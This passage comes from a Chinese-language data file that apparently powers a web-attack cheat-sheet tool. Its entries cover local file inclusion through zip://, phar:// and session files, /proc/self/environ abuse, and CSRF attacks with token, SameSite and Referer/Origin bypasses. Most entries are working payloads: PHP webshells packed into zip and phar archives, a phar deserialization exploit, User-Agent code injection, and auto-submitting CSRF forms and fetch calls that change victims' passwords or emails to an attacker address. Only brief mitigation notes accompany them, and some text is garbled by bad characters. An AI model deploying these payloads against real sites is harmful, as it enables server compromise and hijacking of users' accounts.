        command: '# 创建shell.txt\necho \'<?php system($_GET["c"]); ?>\' > shell.txt\n\n# 创建zip文件\nzip shell.zip shell.txt\n\n# 或使用Python\nimport zipfile\nwith zipfile.ZipFile(\'shell.zip\', \'w\') as z:\n    z.writestr(\'shell.txt\', \'<?php system($_GET["c"]); ?>\')', 
        description: '创建恶意Zip文件', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'zip', explanation: '创建zip压缩包' },
          { part: 'shell.txt', explanation: '包含PHP代码的文件' }
        ]
      },
      { 
        title: '2. 上传Zip文件', 
        command: '# 通过文件上传功能上传shell.zip\n# 或通过其他方式上传\n\n# 记住上传路径\n/uploads/shell.zip', 
        description: '上传Zip文件', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '通过文件上传功能上传shell.zip\n#', explanation: '关键参数', type: 'value' },
          { part: '或通过其他方式上传\n\n#', explanation: '关键参数', type: 'value' },
          { part: '记住上传路径\n/uploads/shell.zip', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '3. 包含Zip文件', 
        command: '# 使用zip://协议包含\n?file=zip://uploads/shell.zip%23shell.txt&c=id\n\n# %23是#的URL编码\n# 格式: zip://路径#文件名', 
        description: '包含Zip文件执行代码', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'zip://', explanation: 'ZIP协议' },
          { part: '%23', explanation: '#的URL编码' },
          { part: 'shell.txt', explanation: 'Zip内的文件名' }
        ]
      },
      { 
        title: '4. 图片马', 
        command: '# 创建图片马\ncopy image.jpg+shell.zip image.jpg\n\n# 或使用\ncat image.jpg shell.zip > image.jpg\n\n# 包含\n?file=zip://uploads/image.jpg%23shell.txt&c=id', 
        description: '使用图片马上传', 
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '%XX', explanation: 'URL编码', type: 'encoding' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '使用phar://', 
        command: '?file=phar://uploads/shell.zip/shell.txt&c=id\n# phar://也可以访问zip文件',
            syntaxBreakdown: [
              { part: '?file=phar://uploads/shell.zip/shell.txt&c=id\n#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' phar://也可以访问zip文件', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '使用phar://协议', 
        platform: 'all'
      },
      { 
        title: '压缩包嵌套', 
        command: '# 在zip中嵌套zip\nzip inner.zip shell.txt\nzip outer.zip inner.zip\n\n# 包含\n?file=zip://outer.zip%23inner.zip%23shell.txt&c=id',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 在zip中嵌套zip\nzip inner.zip shell.txt\nzip outer.zip inner.zip\n\n# 包含\n?file=zip://outer.zip%23inner.zip%23shell.txt&c=id', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '压缩包嵌套绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'zip://伪协议可从ZIP压缩包中读取并包含指定文件，攻击者上传包含恶意PHP代码的ZIP文件(可伪装为图片等)，然后通过LFI的zip://协议包含其中的PHP文件实现代码执行。',
      vulnerability: 'zip://协议利用步骤：1)将PHP webshell压缩为ZIP文件 2)可修改扩展名为.jpg/.png绕过上传限制 3)通过LFI使用zip://upload/shell.jpg#shell.php包含其中的PHP文件 4)PHP解析器会解压并执行其中的代码。',
      exploitation: '完�利用流程：\n1. 创建恶意Zip文件\n2. 上传Zip文件\n3. 使用zip://包含\n4. 执行代码',
      mitigation: '防御措施：\n1. 禁用zip://协议\n2. 严格验证上传文件\n3. 白名单验证文件名\n4. 限制包含目录',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'lfi-phar',
    name: 'Phar反序列化攻击',
    description: '利用Phar反序列化进行RCE',
    category: 'LFI/RFI文件包含',
    subCategory: 'Phar反序列化',
    tags: ['lfi', 'phar', 'deserialization', 'rce'],
    prerequisites: ['存在LFI漏�', 'PHP环境', 'phar扩展可用'],
    execution: [
      { 
        title: '1. 创建Phar文件', 
        command: '# 创建恶意Phar\n<?php\nclass Exploit {\n    function __destruct() {\n        system($_GET[\'c\']);\n    }\n}\n\n$phar = new Phar(\'exploit.phar\');\n$phar->startBuffering();\n$phar->addFromString(\'test.txt\', \'test\');\n$phar->setStub(\'<?php __HALT_COMPILER(); ?>\');\n$o = new Exploit();\n$phar->setMetadata($o);\n$phar->stopBuffering();\n?>', 
        description: '创建恶意Phar文件', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Phar', explanation: 'PHP归档类' },
          { part: 'setMetadata', explanation: '设置元数据(序列化对象)' },
          { part: '__destruct', explanation: '析构函数，反序列化时调用' }
        ]
      },
      { 
        title: '2. 触发反序列化', 
        command: '# 通过file_exists触发\n?file=phar://exploit.phar&c=id\n\n# 通过file_get_contents触发\n?file=phar://exploit.phar/test.txt&c=id\n\n# 通过include触发\n?file=phar://exploit.phar&c=id', 
        description: '触发Phar反序列化', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'phar://', explanation: 'Phar协议' },
          { part: 'exploit.phar', explanation: 'Phar文件' }
        ]
      },
      { 
        title: '3. 图片马Phar', 
        command: '# 创建图片Phar\ncopy exploit.phar exploit.gif\n\n# 或添加GIF�\ncp exploit.phar exploit.gif\n\n# 触发\n?file=phar://uploads/exploit.gif&c=id', 
        description: '使用图片马Phar', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '创建图片Phar\ncopy', explanation: '关键参数', type: 'value' },
          { part: 'exploit.phar', explanation: '关键参数', type: 'value' },
          { part: 'exploit.gif\n\n#', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '4. 常见Gadget链', 
        command: '# Laravel POP链\n# Symfony POP链\n# WordPress POP链\n# ThinkPHP POP链\n\n# 使用phpggc生成\ngit clone https://github.com/ambionics/phpggc\nphp phpggc Laravel/RCE1 system id > exploit.phar', 
        description: '使用常见Gadget链', 
        },
      ],
    wafBypass: [
      { 
        title: 'Base64编码', 
        command: '# 将Phar内容Base64编码\n# 然后解码触发',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 将Phar内容Base64编码\n# 然后解码触发', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: 'Base64编码绕过', 
        platform: 'all'
      },
      { 
        title: '伪协议组合', 
        command: '?file=php://filter/convert.base64-encode/resource=phar://exploit.phar\n# 组合使用',
            syntaxBreakdown: [
              { part: '?file=php://filter/convert.base64-encode/resource=phar://exploit.phar\n#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 组合使用', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '伪协议组合', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'phar://伪协议可包含PHP Archive文件中的内容，类似zip://但功能更强。特别的是，phar反序列化漏洞可在不调用unserialize()的情况下触发PHP对象的反序列化操作。',
      vulnerability: 'phar://不仅可以像zip://一样包含压缩包中的PHP文件，更关键的是phar文件的元数据(metadata)在被任何文件操作函数(file_exists/is_dir等)处理时会被自动反序列化，可触发POP链执行任意代码。',
      exploitation: '完�利用流程：\n1. 找到可利用的类(Gadget)\n2. 创建恶意Phar文件\n3. 上传或构造Phar\n4. 触发反序列化',
      mitigation: '防御措施：\n1. 禁用phar扩展\n2. 过滤phar://协议\n3. 白名单验证文件\n4. 升级PHP版本',
      difficulty: 'advanced'
    }
  },
  {
    id: 'lfi-session',
    name: 'Session文件包含',
    description: '利用Session文件进行LFI攻击',
    category: 'LFI/RFI文件包含',
    subCategory: 'Session包含',
    tags: ['lfi', 'session', 'file', 'inclusion'],
    prerequisites: ['存在LFI漏�', '可控制Session内容', '知道Session路径'],
    execution: [
      { 
        title: '1. 探测Session路径', 
        command: '# Linux默认路径\n/var/lib/php/sessions/sess_[PHPSESSID]\n/var/lib/php5/sess_[PHPSESSID]\n/var/lib/php7/sess_[PHPSESSID]\n/tmp/sess_[PHPSESSID]\n/c:/windows/temp/sess_[PHPSESSID]', 
        description: '探测Session存储路径', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'sess_', explanation: 'Session文件前缀' },
          { part: 'PHPSESSID', explanation: 'Session ID值' }
        ]
      },
      { 
        title: '2. 控制Session内容', 
        command: '# 通过用户输入控制Session\n# 例如用户名、个人简介等\nusername: <?php system($_GET[\'c\']); ?>\n\n# 或通过Cookie\nSet-Cookie: PHPSESSID=malicious', 
        description: '控制Session内容', 
        platform: 'all'
      },
      { 
        title: '3. 包含Session文件', 
        command: '# 包含Session文件\n?file=/var/lib/php/sessions/sess_abc123&c=id\n\n# 或使用相对路径\n?file=../../../var/lib/php/sessions/sess_abc123&c=id', 
        description: '包含Session文件执行代码', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '包含Session文件\n', explanation: '关键参数', type: 'value' },
          { part: 'file', explanation: '关键参数', type: 'value' },
          { part: '/var/lib/php/sessions/sess_abc123', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '4. Session竞争条件', 
        command: '# 利用Session竞争\n# 1. 持续写入恶意代码到Session\n# 2. 同时包含Session文件\n# 3. 在Session被清理前执行', 
        description: '利用Session竞争条件', 
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '利用Session竞争\n#', explanation: '关键参数', type: 'value' },
          { part: '1.', explanation: '关键参数', type: 'value' },
          { part: '持续写入恶意代码到Session\n#', explanation: '关键参数', type: 'value' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: 'Session ID预测', 
        command: '# 尝试预测Session ID\n# 常见模式: md5(ip.time.random)\n# �力枚举Session ID',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 尝试预测Session ID\n# 常见模式: md5(ip.time.random)\n# �力枚举Session ID', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '预测Session ID', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Session文件包含是LFI升级为RCE的重要技术，通过将恶意PHP代码注入Session文件，再利用LFI包含Session文件实现代码执行。Session文件路径通常可预测(如/tmp/sess_PHPSESSID)。',
      vulnerability: 'PHP Session默认存储在文件系统中(/tmp/sess_xxx或/var/lib/php/sessions/sess_xxx)。当应用将用户可控数据(如用户名)存入Session时，攻击者注入PHP代码到Session变量中，再通过LFI包含对应的Session文件触发执行。',
      exploitation: '完�利用流程：\n1. 找到Session存储路径\n2. 控制Session内容\n3. 包含Session文件\n4. 执行代码',
      mitigation: '防御措施：\n1. 限制Session内容\n2. 使用安全的Session存储\n3. 白名单验证文件名\n4. 禁用文件包含',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'lfi-proc',
    name: 'Proc文件系统利用',
    description: '利用/proc文件系统进行LFI攻击',
    category: 'LFI/RFI文件包含',
    subCategory: 'Proc文件系统',
    tags: ['lfi', 'proc', 'linux', 'environ'],
    prerequisites: ['存在LFI漏�', 'Linux系统', '/proc可访问'],
    execution: [
      { 
        title: '1. 读取进程信息', 
        command: '# 当前进程信息\n/proc/self/cmdline\n/proc/self/environ\n/proc/self/cwd\n/proc/self/exe\n/proc/self/fd/0\n/proc/self/fd/1\n/proc/self/fd/2', 
        description: '读取当前进程信息', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: '/proc/self/', explanation: '当前进程目录' },
          { part: 'cmdline', explanation: '启动命令' },
          { part: 'environ', explanation: '环境变量' },
          { part: 'cwd', explanation: '当前工作目录' }
        ]
      },
      { 
        title: '2. 读取环境变量', 
        command: '?file=../../../proc/self/environ\n\n# 在User-Agent中注入\nUser-Agent: <?php system($_GET[\'c\']); ?>\n\n# 包含执行\n?file=../../../proc/self/environ&c=id', 
        description: '读取环境变量执行代码', 
        platform: 'linux'
      },
      { 
        title: '3. 通过fd读取日志', 
        command: '# fd文件描述符\n/proc/self/fd/10\n/proc/self/fd/20\n\n# 尝试不同编号找到日志\n?file=../../../proc/self/fd/10', 
        description: '通过fd读取日志', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'fd文件描述符\n/proc/self/fd/10\n/proc/self/fd', explanation: '关键参数', type: 'value' },
          { part: '尝试不同编号找到日志\n', explanation: '关键参数', type: 'value' },
          { part: 'file', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '4. 读取其他进程', 
        command: '# 枚举进程\n/proc/[pid]/cmdline\n/proc/[pid]/environ\n/proc/[pid]/maps\n\n# �力枚举\n?file=../../../proc/1/cmdline\n?file=../../../proc/2/cmdline', 
        description: '读取其他进程信息', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '�力枚举\n', explanation: '关键参数', type: 'value' },
          { part: 'file', explanation: '关键参数', type: 'value' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '使用self', 
        command: '?file=/proc/self/environ\n?file=proc/self/environ',
            syntaxBreakdown: [
              { part: '?file=/proc/self/environ\n?file=proc/self/environ', explanation: '攻击载荷', type: 'value' }
            ],
        description: '使用self引用', 
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: '/proc文件系统(Linux虚拟文件系统)包含大量系统运行时信息，通过LFI读取/proc目录可获取进程信息、环境变量、网络配置等，/proc/self/environ更可能用于代码执行。',
      vulnerability: '/proc文件系统中的关键文件：/proc/self/environ包含当前进程的环境变量(可能包含密钥)、/proc/self/cmdline包含启动命令、/proc/self/fd/N可读取打开的文件描述符、/proc/net/tcp泄露网络连接信息和内网IP。',
      exploitation: '完�利用流程：\n1. 探测/proc可访问性\n2. 读取environ文件\n3. 注入代码到User-Agent\n4. 包含执行',
      mitigation: '防御措施：\n1. 限制/proc访问\n2. 白名单验证文件名\n3. 过滤特殊字符\n4. 使用chroot隔离',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'csrf-basic',
    name: 'CSRF基础攻击',
    description: '跨站请求伪造基础攻击技术',
    category: 'CSRF跨站请求伪造',
    subCategory: '基础攻击',
    tags: ['csrf', 'cross-site', 'request', 'forgery'],
    prerequisites: ['目标存在敏感操作', '缺少CSRF保护'],
    execution: [
      { 
        title: '1. 构造CSRF表单', 
        command: '<form action="http://target.com/change-password" method="POST">\n  <input type="hidden" name="new_password" value="hacked123">\n  <input type="hidden" name="confirm_password" value="hacked123">\n  <input type="submit" value="Click me">\n</form>\n<script>document.forms[0].submit();</script>', 
        description: '构造自动提交的CSRF表单', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'action', explanation: '目标URL' },
          { part: 'hidden', explanation: '隐藏字段' },
          { part: 'submit()', explanation: '自动提交表单' }
        ]
      },
      { 
        title: '2. GET请求CSRF', 
        command: '<img src="http://target.com/delete?id=123" style="display:none">\n或�接诱导用户点击:\nhttp://target.com/delete?id=123', 
        description: 'GET请求的CSRF攻击', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '<img src>', explanation: '图片标签自动请求' }
        ]
      },
      { 
        title: '3. JSON CSRF', 
        command: '<script>\nfetch("http://target.com/api/change-email", {\n  method: "POST",\n  credentials: "include",\n  headers: {"Content-Type": "text/plain"},\n  body: JSON.stringify({email: "attacker@evil.com"})\n});\n</script>', 
        description: 'JSON格式的CSRF攻击', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'credentials: "include"', explanation: '包含Cookie' },
          { part: 'text/plain', explanation: '绕过预检请求' }
        ]
      },
      { 
        title: '4. 链接诱导', 
        command: '<a href="http://target.com/action?param=value">点击领取红包</a>\n或短链接隐藏真实URL', 
        description: '诱导用户点击', 
        syntaxBreakdown: [
          { part: 'http://target.com/action?param=value', explanation: '目标URL', type: 'value' },
          { part: '<a', explanation: '关键参数', type: 'value' },
          { part: 'href', explanation: '关键参数', type: 'value' },
          { part: '"http://target.com/action', explanation: '关键参数', type: 'value' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: 'Referer绕过', 
        command: '使用Referrer Policy:\n<meta name="referrer" content="no-referrer">\n或使用data URL:\n<data:text/html;base64,CSRF_PAYLOAD>\n或使用HTTPS->HTTP降级', 
        description: '绕过Referer检查', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'no-referrer', explanation: '不发送Referer�' }
        ]
      },
      { 
        title: 'Token绕过', 
        command: '1. 检查Token是否可预测\n2. 检查Token是否绑定会话\n3. 检查Token是否在GET参数中泄露\n4. 检查是否有Token重放漏�',
            syntaxBreakdown: [
              { part: '1.', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 检查Token是否可预测\n2. 检查Token是否绑定会话\n3. 检查Token是否在GET参数中泄露\n4. 检查是否有Token重放漏�', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '绕过Token验证', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'CSRF(Cross-Site Request Forgery)跨站请求伪造利用浏览器自动携带Cookie的特性，诱导已认证用户在不知情的情况下执行攻击者预设的操作(如转账、修改密码、更改邮箱等)。',
      vulnerability: 'CSRF漏洞存在于缺乏请求来源验证的敏感操作中。浏览器在发送同站请求时自动附带Cookie，攻击者构造包含恶意表单/请求的页面，受害者访问后浏览器自动以其身份发送请求。关键条件：操作仅依赖Cookie认证、无CSRF Token验证。',
      exploitation: '完�利用流程：\n1. 找到敏感操作\n2. 分析请求格式\n3. 构造恶意页面\n4. 诱导受害者访问\n5. 自动执行恶意请求',
      mitigation: '防御措施：\n1. 使用CSRF Token\n2. 验证Referer�\n3. 使用SameSite Cookie属性\n4. 关键操作要求二次验证',
      difficulty: 'beginner'
    }
  },
  {
    id: 'csrf-json',
    name: 'JSON CSRF攻击',
    description: '针对JSON请求的CSRF攻击技术',
    category: 'CSRF跨站请求伪造',
    subCategory: 'JSON CSRF',
    tags: ['csrf', 'json', 'api', 'post'],
    prerequisites: ['目标使用JSON格式请求', '缺少CSRF保护', 'CORS配置不当'],
    execution: [
      { 
        title: '1. 简单JSON CSRF', 
        command: '<script>\nfetch("http://target.com/api/update", {\n  method: "POST",\n  credentials: "include",\n  headers: {"Content-Type": "text/plain"},\n  body: JSON.stringify({email: "attacker@evil.com"})\n});\n</script>', 
        description: '使用text/plain绕过预检', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'fetch()', explanation: '发起HTTP请求' },
          { part: 'credentials: "include"', explanation: '包含Cookie' },
          { part: 'text/plain', explanation: '绕过CORS预检' }
        ]
      },
      { 
        title: '2. Flash JSON CSRF', 
        command: '# 使用Flash发送JSON请求\n# 需要目标允许Content-Type: application/json\n# 配合Flash的跨域能力', 
        description: '使用Flash发送JSON', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '使用Flash发送JSON请求\n#', explanation: '关键参数', type: 'value' },
          { part: '需要目标允许Content-Type:', explanation: '关键参数', type: 'value' },
          { part: 'application/json\n#', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '3. XSSI攻击', 
        description: '跨站脚本包含攻击', 
        command: '# 利用JSONP回调\n<script src="http://target.com/api/data?callback=attacker"></script>\nfunction attacker(data) { console.log(data); }\n\n# 利用数组返回\n[{"secret": "data"}]\n<script>var data = [{"secret": "data"}];</script>', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'JSONP', explanation: 'JSON with Padding' },
          { part: 'callback', explanation: '回调函数名' }
        ]
      },
      { 
        title: '4. SWF文件攻击', 
        command: '# 创建恶意SWF文件发送JSON请求\n# 编译ActionScript代码\n# 嵌入HTML页面', 
        description: '使用SWF文件', 
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '创建恶意SWF文件发送JSON请求\n#', explanation: '关键参数', type: 'value' },
          { part: '编译ActionScript代码\n#', explanation: '关键参数', type: 'value' },
          { part: '嵌入HTML页面', explanation: '关键参数', type: 'value' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '修改Content-Type', 
        command: '# 尝试不同的Content-Type\ntext/plain\napplication/x-www-form-urlencoded\napplication/x-www-form-urlencoded; charset=UTF-8',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 尝试不同的Content-Type\ntext/plain\napplication/x-www-form-urlencoded\napplication/x-www-form-urlencoded; charset=UTF-8', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '修改Content-Type绕过', 
        platform: 'all'
      },
      { 
        title: '使用FormData', 
        command: 'let formData = new FormData();\nformData.append("data", JSON.stringify({email: "attacker@evil.com"}));\nfetch(url, {method: "POST", body: formData, credentials: "include"});',
        description: '使用FormData发送', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'JSON CSRF攻击针对接收JSON格式数据的API接口，虽然Content-Type: application/json通常触发预检请求(CORS保护)，但存在多种绕过技术使攻击成为可能。',
      vulnerability: 'JSON CSRF的绕过方式：1)使用text/plain类型发送JSON格式数据(某些后端仍解析) 2)利用Flash发送自定义Content-Type(旧浏览器) 3)使用fetch API配合宽松CORS策略 4)Navigator.sendBeacon()发送POST请求。',
      exploitation: '完�利用流程：\n1. 分析目标API请求格式\n2. 确认CORS配置\n3. 构造JSON payload\n4. 使用text/plain绕过预检\n5. 诱导用户触发',
      mitigation: '防御措施：\n1. 验证Content-Type\n2. 使用CSRF Token\n3. 配置正确的CORS\n4. 验证Origin�',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'csrf-bypass',
    name: 'CSRF绕过技术',
    description: '绕过CSRF防护的各种技术',
    category: 'CSRF跨站请求伪造',
    subCategory: '绕过技术',
    tags: ['csrf', 'bypass', 'token', 'referer'],
    prerequisites: ['目标存在CSRF防护', '防护机制存在缺陷'],
    execution: [
      { 
        title: '1. Token验证绕过', 
        command: '# Token可预测\n分析Token生成规律，预测有效Token\n\n# Token未绑定会话\n使用其他用户的Token\n\n# Token重用\n同一个Token可多次使用\n\n# Token在GET参数中泄露\n从页面源码获取Token', 
        description: '绕过Token验证', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Token可预测', explanation: 'Token有规律可循' },
          { part: 'Token未绑定', explanation: 'Token与会话无关' }
        ]
      },
      { 
        title: '2. Referer验证绕过', 
        command: '# 正则匹配不严谨\nReferer: http://attacker.com/target.com/\nReferer: http://target.com.attacker.com/\n\n# 空Referer\n<meta name="referrer" content="no-referrer">\n\n# HTTPS->HTTP降级\n从HTTPS站点跳转到HTTP不发送Referer', 
        description: '绕过Referer验证', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '正则绕过', explanation: '利用正则匹配缺陷' },
          { part: 'no-referrer', explanation: '不发送Referer' }
        ]
      },
      { 
        title: '3. Origin验证绕过', 
        command: '# Origin为null\n使用data URL或about:blank\n\n# 正则绕过\nOrigin: http://target.com.attacker.com\nOrigin: http://attacktarget.com\n\n# IE11不发送Origin\nIE11在某些情况下不发送Origin�', 
        description: '绕过Origin验证', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'http://target.com.attacker.com\nOrigin:', explanation: '目标URL', type: 'value' },
          { part: '# Origin为null\n使用data URL或abou', explanation: '绕过技术', type: 'technique' }
        ]
      },
      { 
        title: '4. SameSite绕过', 
        command: '# SameSite=Lax\nGET请求会发送Cookie\n构造GET形式的敏感操作\n\n# SameSite未设置\n默认行为可能允许跨站发送\n\n# 两分钟窗口\nSameSite=Lax有2分钟窗口期', 
        description: '绕过SameSite限制', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'SameSite=Lax', explanation: 'GET请求允许Cookie' },
          { part: '2分钟窗口', explanation: 'Lax模式的宽限期' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: 'CORS配置错误', 
        command: '# Access-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\n\n# Access-Control-Allow-Origin: *\n允许任意源\n\n# 反射Origin\nAccess-Control-Allow-Origin: [任意Origin]',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' Access-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\n\n# Access-Control-Allow-Origin: *\n允许任意源\n\n# 反射Origin\nAccess-Control-Allow-Origin: [任意Origin]', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '利用CORS配置错误', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'CSRF防护绕过技术针对各种不完善的Token实现，包括Token值可预测、Token未绑定会话、静态Token重用、仅验证Token存在性(不验证值)等常见缺陷。',
      vulnerability: 'CSRF Token绕过的常见场景：1)删除Token参数后服务器不验证 2)使用空值Token通过验证 3)Token未与Session绑定(可使用攻击者自己的Token) 4)Token可通过XSS窃取 5)Referer验证用正则可被绕过。',
      exploitation: '完�利用流程：\n1. 分析CSRF防护机制\n2. 找到验证缺陷\n3. 构造绕过payload\n4. 执行CSRF攻击',
      mitigation: '防御措施：\n1. 使用安全的Token机制\n2. Token绑定会话\n3. 严格验证Referer/Origin\n4. 使用SameSite=Strict',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'csrf-samesite',
    name: 'SameSite绕过技术',
    description: '绕过SameSite Cookie属性的CSRF攻击',
    category: 'CSRF跨站请求伪造',
    subCategory: 'SameSite绕过',
    tags: ['csrf', 'samesite', 'cookie', 'bypass'],
    prerequisites: ['Cookie设置了SameSite属性', 'SameSite配置存在缺陷'],
    execution: [
      { 
        title: '1. SameSite=Lax绕过', 
        command: '# GET请求绕过\n构造GET形式的敏感操作\n<img src="http://target.com/delete?id=123">\n\n# 顶级导航\n<a href="http://target.com/action">点击</a>\nwindow.location = "http://target.com/action"\n\n# 两分钟窗口\n在用户交互后2分钟内发起请求', 
        description: '绕过SameSite=Lax', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'GET请求', explanation: 'Lax允许GET携带Cookie' },
          { part: '顶级导航', explanation: 'Lax允许顶级导航' },
          { part: '2分钟窗口', explanation: '用户交互后的宽限期' }
        ]
      },
      { 
        title: '2. SameSite=Strict绕过', 
        command: '# 子域名攻击\n从子域名发起请求\nhttp://sub.target.com/attack\n\n# Cookie覆盖\n设置同名Cookie覆盖\nSet-Cookie: session=attacker; Domain=.target.com\n\n# 利用重定向\n从目标站点重定向到攻击页面', 
        description: '绕过SameSite=Strict', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'http://sub.target.com/attack\n\n#', explanation: '目标URL', type: 'value' },
          { part: '# 子域名攻击\n从子域名发起请求\nhttp://sub.', explanation: '绕过技术', type: 'technique' }
        ]
      },
      { 
        title: '3. 未设置SameSite', 
        command: '# 旧浏览器默认行为\nChrome < 80 默认None\nSafari 默认None\n\n# 可�接发起CSRF攻击\n无需特殊绕过', 
        description: '利用未设置SameSite', 
        platform: 'all'
      },
      { 
        title: '4. 利用OAuth流程', 
        command: '# OAuth回调绕过SameSite\n1. 发起OAuth登录\n2. 在回调中注入恶意请求\n3. Cookie在OAuth流程中发送', 
        description: '利用OAuth流程', 
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '# OAuth回调绕过SameSite\n1. 发起OAut', explanation: '利用载荷', type: 'value' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '混合内容', 
        command: '# HTTPS->HTTP降级\n从HTTPS站点发起HTTP请求\n某些情况下不发送SameSite',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' HTTPS->HTTP降级\n从HTTPS站点发起HTTP请求\n某些情况下不发送SameSite', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '利用混合内容', 
        platform: 'all'
      },
      { 
        title: '客户端重定向', 
        command: '# JavaScript重定向\nlocation.href = "http://target.com/action"\n可能绕过某些SameSite检查',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' JavaScript重定向\nlocation.href = "http://target.com/action"\n可能绕过某些SameSite检查', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '客户端重定向', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'SameSite Cookie属性是浏览器层面的CSRF防御机制，但配置不当(如SameSite=None)或使用GET请求触发状态变更操作时仍可被绕过，需要结合其他防御措施。',
      vulnerability: 'SameSite绕过场景：1)SameSite=Lax下GET请求仍携带Cookie(针对GET方法的状态变更) 2)SameSite=None配置错误 3)子域名间Cookie共享 4)通过window.open/top-level导航绕过Lax限制 5)旧浏览器不支持SameSite属性。',
      exploitation: '完�利用流程：\n1. 确定SameSite配置\n2. 选择合适的绕过方法\n3. 构造GET请求或利用窗口期\n4. 执行CSRF攻击',
      mitigation: '防御措施：\n1. 使用SameSite=Strict\n2. 配合CSRF Token\n3. 关键操作使用POST\n4. 验证请求来源',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'csrf-token-bypass',
    name: 'Token绕过技术',
    description: '绕过CSRF Token验证的技术',
    category: 'CSRF跨站请求伪造',
    subCategory: 'Token绕过',
    tags: ['csrf', 'token', 'bypass', 'predictable'],
    prerequisites: ['目标使用CSRF Token', 'Token机制存在缺陷'],
    execution: [
      { 
        title: '1. Token可预测', 
        command: '# 分析Token生成规律\n# 常见弱Token模式:\n- 时�戳\n- 递增数字\n- 用户ID哈希\n- 弱随机数\n\n# 预测并构造有效Token', 
        description: '预测Token值', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '时�戳', explanation: '基于时�的Token' },
          { part: '递增数字', explanation: '可预测的序列' }
        ]
      },
      { 
        title: '2. Token未绑定会话', 
        command: '# Token不验证会话\n# 攻击步骤:\n1. 攻击者获取自己的Token\n2. 使用该Token构造CSRF\n3. 诱使受害者提交\n\n# Token可跨用户使用', 
        description: '利用未绑定Token', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
